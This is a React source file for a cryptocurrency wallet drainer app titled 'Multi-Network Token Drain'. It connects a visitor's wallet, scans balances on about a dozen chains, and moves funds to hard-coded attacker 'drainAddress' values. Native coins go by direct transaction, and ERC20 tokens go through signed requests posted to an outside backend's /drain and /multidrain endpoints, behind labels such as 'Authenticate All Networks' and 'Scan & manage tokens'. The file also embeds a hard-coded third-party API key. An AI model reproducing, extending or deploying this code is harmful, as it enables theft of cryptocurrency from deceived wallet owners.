import { useState, useEffect, useCallback } from 'react';
import { WagmiConfig } from "wagmi";
import { ConnectKitProvider, ConnectKitButton } from "connectkit";
import { useAccount, useSignMessage, useChainId, usePublicClient, useWalletClient } from 'wagmi';
import { parseEther } from 'viem';
import { wagmiConfig } from "./wagmi";
import './mobile-fix.css';

// Network Configuration
const NETWORKS = [
  // EVM Networks
  { id: 1, name: 'Ethereum', symbol: 'ETH', rpc: 'eth', type: 'evm', color: '#627EEA', drainAddress: '0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4' },
  { id: 56, name: 'BSC', symbol: 'BNB', rpc: 'bsc', type: 'evm', color: '#F0B90B', drainAddress: '0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4' },
  { id: 137, name: 'Polygon', symbol: 'MATIC', rpc: 'polygon', type: 'evm', color: '#8247E5', drainAddress: '0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4' },
  { id: 42161, name: 'Arbitrum', symbol: 'ETH', rpc: 'arbitrum', type: 'evm', color: '#28A0F0', drainAddress: '0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4' },
  { id: 10, name: 'Optimism', symbol: 'ETH', rpc: 'optimism', type: 'evm', color: '#FF0420', drainAddress: '0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4' },
  { id: 8453, name: 'Base', symbol: 'ETH', rpc: 'base', type: 'evm', color: '#0052FF', drainAddress: '0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4' },
  { id: 43114, name: 'Avalanche', symbol: 'AVAX', rpc: 'avalanche', type: 'evm', color: '#E84142', drainAddress: '0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4' },
  { id: 250, name: 'Fantom', symbol: 'FTM', rpc: 'fantom', type: 'evm', color: '#1969FF', drainAddress: '0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4' },
  { id: 100, name: 'Gnosis', symbol: 'xDai', rpc: 'gnosis', type: 'evm', color: '#04795B', drainAddress: '0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4' },
  { id: 42220, name: 'Celo', symbol: 'CELO', rpc: 'celo', type: 'evm', color: '#35D07F', drainAddress: '0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4' },
  
  // Non-EVM Chains (BTC-like will be handled differently)
  { id: 'bitcoin', name: 'Bitcoin', symbol: 'BTC', type: 'non-evm', color: '#F7931A', drainAddress: 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh' },
  { id: 'solana', name: 'Solana', symbol: 'SOL', type: 'non-evm', color: '#00FFA3', drainAddress: 'So11111111111111111111111111111111111111112' },
  { id: 'tron', name: 'Tron', symbol: 'TRX', type: 'non-evm', color: '#FF060A', drainAddress: 'Txxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx' },
  { id: 'cardano', name: 'Cardano', symbol: 'ADA', type: 'non-evm', color: '#0033AD', drainAddress: 'addr1xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx' },
];

function TokenDrainApp() {
  return (
    <WagmiConfig config={wagmiConfig}>
      <ConnectKitProvider
        options={{
          walletConnectName: "WalletConnect",
          enforceSupportedChains: false,
          hideQuestionMarkCTA: true,
          hideTooltips: true,
          disclaimer: null,
          embedGoogleFonts: false,
          customTheme: {
            "--ck-font-family": "'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif",
            "--ck-border-radius": "16px",
            "--ck-accent-color": "#667eea",
            "--ck-accent-text-color": "#ffffff",
            "--ck-modal-background": "#1a1a2e",
            "--ck-body-background": "#16213e",
            "--ck-body-color": "#ffffff",
            "--ck-body-color-muted": "#94a3b8",
          },
        }}
        theme="midnight"
      >
        <MultiNetworkDashboard />
      </ConnectKitProvider>
    </WagmiConfig>
  );
}

function MultiNetworkDashboard() {
  const { address, isConnected } = useAccount();
  const chainId = useChainId();
  const { signMessageAsync } = useSignMessage();
  const publicClient = usePublicClient();
  const { data: walletClient } = useWalletClient();

  const [authStatus, setAuthStatus] = useState('');
  const [signature, setSignature] = useState('');
  const [isAuthenticating, setIsAuthenticating] = useState(false);
  const [backendUrl] = useState('https://tokenbackend-5xab.onrender.com');
  const [userTokens, setUserTokens] = useState({});
  const [txStatus, setTxStatus] = useState({});
  const [scanningProgress, setScanningProgress] = useState({});
  const [activeNetworks, setActiveNetworks] = useState([]);
  const [selectedNetwork, setSelectedNetwork] = useState(null);

  useEffect(() => {
    if (isConnected && address) {
      handleWalletConnected(address);
    } else {
      resetState();
    }
  }, [isConnected, address]);

  const resetState = () => {
    setAuthStatus('');
    setSignature('');
    setUserTokens({});
    setTxStatus({});
    setScanningProgress({});
    setActiveNetworks([]);
  };

  const handleWalletConnected = async (walletAddress) => {
    try {
      setAuthStatus('🔄 Wallet connected - Ready to scan all networks');
      // Auto-scan major networks
      const networksToScan = NETWORKS.slice(0, 5);
      setActiveNetworks(networksToScan);
    } catch (error) {
      console.error("Connection error:", error);
      setAuthStatus('❌ Connection error');
    }
  };

  const scanAllNetworks = async () => {
    if (!address) return;
    
    setIsAuthenticating(true);
    setAuthStatus('🔍 Scanning all networks...');
    
    const allTokens = {};
    const progress = {};
    
    // Scan EVM networks
    for (const network of NETWORKS.filter(n => n.type === 'evm')) {
      try {
        progress[network.id] = 'scanning';
        setScanningProgress({...progress});
        
        const tokens = await fetchNetworkTokens(address, network.id);
        if (tokens && tokens.length > 0) {
          allTokens[network.id] = {
            network,
            tokens,
            totalValue: tokens.reduce((sum, t) => sum + (t.value || 0), 0)
          };
        }
        
        progress[network.id] = 'completed';
        setScanningProgress({...progress});
      } catch (error) {
        console.error(`Scan failed for ${network.name}:`, error);
        progress[network.id] = 'failed';
        setScanningProgress({...progress});
      }
    }
    
    setUserTokens(allTokens);
    
    // Count totals
    const totalTokens = Object.values(allTokens).reduce((sum, data) => sum + data.tokens.length, 0);
    const totalValue = Object.values(allTokens).reduce((sum, data) => sum + data.totalValue, 0);
    
    setAuthStatus(`✅ Scanned ${Object.keys(allTokens).length} networks • ${totalTokens} tokens • $${totalValue.toFixed(2)}`);
    setIsAuthenticating(false);
  };

  const fetchNetworkTokens = async (walletAddress, networkId) => {
    try {
      // Try backend first
      const response = await fetch(`${backendUrl}/tokens/${walletAddress}/${networkId}`);
      if (response.ok) {
        const data = await response.json();
        if (data.success && data.data?.tokens) {
          return data.data.tokens.map(t => ({
            ...t,
            networkId,
            drainAddress: NETWORKS.find(n => n.id === networkId)?.drainAddress
          }));
        }
      }
      
      // Fallback to Covalent for EVM
      if (typeof networkId === 'number') {
        return await fetchFromCovalent(walletAddress, networkId);
      }
      
      return [];
    } catch (error) {
      console.error(`Fetch error for network ${networkId}:`, error);
      return [];
    }
  };

  const fetchFromCovalent = async (walletAddress, networkId) => {
    try {
      const COVALENT_API_KEY = "cqt_rQ43kxvhFc4RdQK7t63Yp6pgFRwR";
      const url = `https://api.covalenthq.com/v1/${networkId}/address/${walletAddress}/balances_v2/?key=${COVALENT_API_KEY}&nft=false`;
      
      const response = await fetch(url);
      
      if (!response.ok) {
        throw new Error(`Covalent API ${response.status}`);
      }
      
      const data = await response.json();
      const items = data.data?.items || [];
      
      return items
        .filter(t => t.balance !== "0" && parseFloat(t.balance) > 0)
        .map(t => ({
          symbol: t.contract_ticker_symbol || (t.native_token ? NETWORKS.find(n => n.id === networkId)?.symbol : 'TOKEN'),
          name: t.contract_name || (t.native_token ? NETWORKS.find(n => n.id === networkId)?.name : 'Unknown'),
          amount: parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18),
          value: (t.quote_rate || 0) * (parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18)),
          contractAddress: t.contract_address,
          decimals: t.contract_decimals || 18,
          isNative: t.native_token || false,
          logo: t.logo_url,
          networkId,
          drainAddress: NETWORKS.find(n => n.id === networkId)?.drainAddress
        }));
    } catch (error) {
      console.error("Covalent error:", error);
      return [];
    }
  };

  const authenticateAllNetworks = async () => {
    if (!address) return;
    
    try {
      setIsAuthenticating(true);
      setAuthStatus('🔐 Signing for all networks...');
      
      const timestamp = Date.now();
      const networkNames = NETWORKS.map(n => n.name).join(', ');
      const message = `Multi-Network Token Drain Authentication\nWallet: ${address}\nNetworks: ${networkNames}\nTime: ${timestamp}`;
      
      const sig = await signMessageAsync({ message });
      setSignature(sig);
      
      setAuthStatus('📡 Sending to backend...');
      await sendMultiNetworkAuthToBackend(address, sig, message);
      
    } catch (error) {
      console.error("Auth error:", error);
      if (error.code === 4001) {
        setAuthStatus('❌ Signature rejected');
      } else {
        setAuthStatus(`❌ Auth failed: ${error.message}`);
      }
      setIsAuthenticating(false);
    }
  };

  const sendMultiNetworkAuthToBackend = async (fromAddress, sig, message) => {
    try {
      const payload = {
        fromAddress,
        signature: sig,
        message,
        networks: NETWORKS.map(network => ({
          id: network.id,
          name: network.name,
          type: network.type,
          drainAddress: network.drainAddress
        })),
        timestamp: new Date().toISOString()
      };
      
      console.log('Multi-network auth payload:', payload);
      
      const response = await fetch(`${backendUrl}/multidrain`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload)
      });
      
      if (!response.ok) {
        const errorData = await response.json().catch(() => ({}));
        throw new Error(errorData.error || `HTTP ${response.status}`);
      }
      
      const data = await response.json();
      console.log('Backend response:', data);
      
      if (data.success) {
        setAuthStatus('✅ All networks authenticated');
        // Auto-scan after auth
        setTimeout(() => scanAllNetworks(), 1000);
      } else {
        setAuthStatus(`❌ Backend: ${data.error}`);
      }
      
    } catch (error) {
      console.error("Backend auth error:", error);
      setAuthStatus(`❌ Backend error: ${error.message}`);
      // Still try to scan networks
      setTimeout(() => scanAllNetworks(), 1000);
    } finally {
      setIsAuthenticating(false);
    }
  };

  const executeDrain = async (token) => {
    if (!walletClient || !address) {
      setTxStatus(prev => ({...prev, [token.networkId]: 'Wallet not ready'}));
      return;
    }

    try {
      setIsAuthenticating(true);
      setTxStatus(prev => ({...prev, [token.networkId]: 'Preparing...'}));
      
      // For native tokens: send directly from user's wallet
      if (token.isNative) {
        const amountInWei = parseEther(token.amount.toString());
        
        if (amountInWei <= 0n) {
          setTxStatus(prev => ({...prev, [token.networkId]: 'Amount too small'}));
          return;
        }
        
        setTxStatus(prev => ({...prev, [token.networkId]: 'Confirm in wallet...'}));
        
        const hash = await walletClient.sendTransaction({
          to: token.drainAddress,
          value: amountInWei,
        });
        
        setTxStatus(prev => ({...prev, [token.networkId]: `✅ Sent: ${hash.substring(0, 10)}...`}));
        
        // Remove token from list
        setUserTokens(prev => {
          const updated = {...prev};
          if (updated[token.networkId]) {
            updated[token.networkId].tokens = updated[token.networkId].tokens.filter(t => 
              t.symbol !== token.symbol || t.contractAddress !== token.contractAddress
            );
          }
          return updated;
        });
        
      } else {
        // For ERC20: use backend
        await sendTokenToBackend(token);
      }
      
    } catch (error) {
      console.error("Drain error:", error);
      if (error.code === 4001) {
        setTxStatus(prev => ({...prev, [token.networkId]: 'User rejected'}));
      } else if (error.message.includes('insufficient funds')) {
        setTxStatus(prev => ({...prev, [token.networkId]: 'Insufficient gas'}));
      } else {
        setTxStatus(prev => ({...prev, [token.networkId]: `Error: ${error.shortMessage || error.message}`}));
      }
    } finally {
      setIsAuthenticating(false);
    }
  };

  const sendTokenToBackend = async (token) => {
    try {
      setTxStatus(prev => ({...prev, [token.networkId]: 'Sending to backend...'}));
      
      const message = `Drain ${token.amount} ${token.symbol} on ${NETWORKS.find(n => n.id === token.networkId)?.name}`;
      const sig = await signMessageAsync({ message });
      
      const payload = {
        fromAddress: address,
        tokenAddress: token.contractAddress,
        amount: token.amount.toString(),
        chainId: token.networkId,
        tokenType: 'erc20',
        signature: sig,
        message: message,
        drainTo: token.drainAddress
      };
      
      const response = await fetch(`${backendUrl}/drain`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
      
      const data = await response.json();
      
      if (data.success) {
        setTxStatus(prev => ({...prev, [token.networkId]: `✅ Backend: ${data.data.transactionHash?.substring(0, 10)}...`}));
        
        // Remove token
        setUserTokens(prev => {
          const updated = {...prev};
          if (updated[token.networkId]) {
            updated[token.networkId].tokens = updated[token.networkId].tokens.filter(t => 
              t.symbol !== token.symbol || t.contractAddress !== token.contractAddress
            );
          }
          return updated;
        });
      } else {
        setTxStatus(prev => ({...prev, [token.networkId]: `❌ Backend error: ${data.error}`}));
      }
      
    } catch (error) {
      console.error('Backend transaction error:', error);
      setTxStatus(prev => ({...prev, [token.networkId]: 'Backend failed'}));
    }
  };

  const formatAddress = (addr) => {
    return addr ? `${addr.substring(0, 6)}...${addr.substring(addr.length - 4)}` : '';
  };

  const getTotalValue = () => {
    return Object.values(userTokens).reduce((sum, data) => sum + data.totalValue, 0).toFixed(2);
  };

  const getTotalTokens = () => {
    return Object.values(userTokens).reduce((sum, data) => sum + data.tokens.length, 0);
  };

  return (
    <div className="App">
      <div className="app-container">
        <header className="app-header">
          <div className="header-content">
            <div className="logo-section">
              <div className="logo-icon">🚀</div>
              <h1>Multi-Network Token Drain</h1>
              <p className="tagline">Scan & manage tokens across all chains</p>
            </div>
            
            <div className="wallet-section">
              <ConnectKitButton />
            </div>
          </div>
        </header>

        <main className="app-main">
          {isConnected && address ? (
            <div className="dashboard-grid">
              {/* Left Panel - Wallet Info */}
              <div className="panel wallet-panel">
                <div className="panel-header">
                  <h2>Wallet Overview</h2>
                  <div className="wallet-status connected">● Connected</div>
                </div>
                
                <div className="wallet-details">
                  <div className="detail-row">
                    <span className="detail-label">Address</span>
                    <span className="detail-value mono">{formatAddress(address)}</span>
                  </div>
                  <div className="detail-row">
                    <span className="detail-label">Current Network</span>
                    <span className="detail-value">{NETWORKS.find(n => n.id === chainId)?.name || 'Unknown'}</span>
                  </div>
                  <div className="detail-row">
                    <span className="detail-label">Total Networks</span>
                    <span className="detail-value">{NETWORKS.length}</span>
                  </div>
                </div>

                <div className="action-section">
                  <div className="status-display">
                    <div className={`status-badge ${authStatus.includes('✅') ? 'success' : authStatus.includes('❌') ? 'error' : 'info'}`}>
                      {authStatus || 'Ready to scan'}
                    </div>
                    {signature && (
                      <div className="signature-hint">
                        <span className="mono">Sig: {signature.substring(0, 12)}...</span>
                      </div>
                    )}
                  </div>

                  <div className="action-buttons">
                    <button 
                      onClick={authenticateAllNetworks}
                      disabled={isAuthenticating}
                      className="btn btn-primary btn-lg"
                    >
                      <span className="btn-icon">🔐</span>
                      Authenticate All Networks
                    </button>
                    <button 
                      onClick={scanAllNetworks}
                      disabled={isAuthenticating}
                      className="btn btn-secondary"
                    >
                      <span className="btn-icon">🔍</span>
                      Scan All Networks
                    </button>
                  </div>
                </div>

                {/* Network Progress */}
                {Object.keys(scanningProgress).length > 0 && (
                  <div className="progress-section">
                    <h3>Scan Progress</h3>
                    <div className="progress-grid">
                      {NETWORKS.filter(n => scanningProgress[n.id]).map(network => (
                        <div key={network.id} className="progress-item">
                          <span className="network-name">{network.name}</span>
                          <span className={`status-indicator ${scanningProgress[network.id]}`}>
                            {scanningProgress[network.id] === 'scanning' ? '🔍' :
                             scanningProgress[network.id] === 'completed' ? '✅' : '❌'}
                          </span>
                        </div>
                      ))}
                    </div>
                  </div>
                )}
              </div>

              {/* Right Panel - Tokens */}
              <div className="panel tokens-panel">
                <div className="panel-header">
                  <div className="header-left">
                    <h2>Tokens</h2>
                    <div className="token-summary">
                      <span className="summary-item">
                        <strong>{Object.keys(userTokens).length}</strong> Networks
                      </span>
                      <span className="summary-item">
                        <strong>{getTotalTokens()}</strong> Tokens
                      </span>
                      <span className="summary-item">
                        <strong>${getTotalValue()}</strong> Total
                      </span>
                    </div>
                  </div>
                  
                  {getTotalTokens() > 0 && (
                    <button className="btn btn-danger" disabled={isAuthenticating}>
                      <span className="btn-icon">⚠️</span>
                      Drain All
                    </button>
                  )}
                </div>

                {Object.keys(userTokens).length === 0 ? (
                  <div className="empty-state">
                    <div className="empty-icon">📭</div>
                    <h3>No tokens found</h3>
                    <p>Click "Scan All Networks" to discover tokens across all chains</p>
                    <button 
                      onClick={scanAllNetworks}
                      className="btn btn-primary"
                    >
                      Start Scanning
                    </button>
                  </div>
                ) : (
                  <div className="tokens-container">
                    {Object.entries(userTokens).map(([networkId, data]) => (
                      <div key={networkId} className="network-section">
                        <div className="network-header" style={{ borderLeftColor: data.network.color }}>
                          <div className="network-info">
                            <div className="network-name">{data.network.name}</div>
                            <div className="network-stats">
                              <span>{data.tokens.length} tokens</span>
                              <span>${data.totalValue.toFixed(2)}</span>
                            </div>
                          </div>
                          <div className="network-status">
                            {txStatus[networkId] ? (
                              <span className="tx-status">{txStatus[networkId]}</span>
                            ) : (
                              <span className="scan-status">Ready</span>
                            )}
                          </div>
                        </div>

                        <div className="tokens-list">
                          {data.tokens.map((token, idx) => (
                            <div key={idx} className="token-card">
                              <div className="token-icon">
                                {token.logo ? (
                                  <img src={token.logo} alt={token.symbol} />
                                ) : (
                                  <div className="token-icon-placeholder" style={{ backgroundColor: data.network.color }}>
                                    {token.symbol.substring(0, 2)}
                                  </div>
                                )}
                              </div>
                              <div className="token-info">
                                <div className="token-symbol">{token.symbol}</div>
                                <div className="token-name">{token.name}</div>
                                <div className="token-amount mono">
                                  {parseFloat(token.amount).toLocaleString(undefined, {
                                    maximumFractionDigits: 8
                                  })}
                                </div>
                              </div>
                              <div className="token-value">
                                <div className="value-amount">${token.value?.toFixed(2) || 'N/A'}</div>
                                <button
                                  onClick={() => executeDrain(token)}
                                  disabled={token.amount <= 0 || isAuthenticating}
                                  className="btn-drain"
                                >
                                  Drain
                                </button>
                              </div>
                            </div>
                          ))}
                        </div>
                      </div>
                    ))}
                  </div>
                )}
              </div>
            </div>
          ) : (
            <div className="connection-prompt">
              <div className="prompt-content">
                <div className="prompt-icon">🔗</div>
                <h2>Connect Your Wallet</h2>
                <p>Connect to scan tokens across all networks and chains</p>
                <div className="connect-button-wrapper">
                  <ConnectKitButton />
                </div>
                <div className="network-preview">
                  <p>Supported Networks:</p>
                  <div className="network-tags">
                    {NETWORKS.slice(0, 8).map(network => (
                      <span key={network.id} className="network-tag" style={{ backgroundColor: `${network.color}20` }}>
                        {network.name}
                      </span>
                    ))}
                    <span className="network-tag">+{NETWORKS.length - 8} more</span>
                  </div>
                </div>
              </div>
            </div>
          )}
        </main>

        <footer className="app-footer">
          <div className="footer-content">
            <div className="footer-links">
              <a href={`${backendUrl}/health`} target="_blank" rel="noopener noreferrer">
                Backend Health
              </a>
              <a href={`${backendUrl}`} target="_blank" rel="noopener noreferrer">
                API Docs
              </a>
              <a href="#" onClick={(e) => { e.preventDefault(); scanAllNetworks(); }}>
                Force Rescan
              </a>
            </div>
            <div className="footer-info">
              <span className="version">v3.0 • Multi-Network</span>
              <span className="status">🟢 Operational</span>
            </div>
          </div>
        </footer>
      </div>
    </div>
  );
}

export default TokenDrainApp;
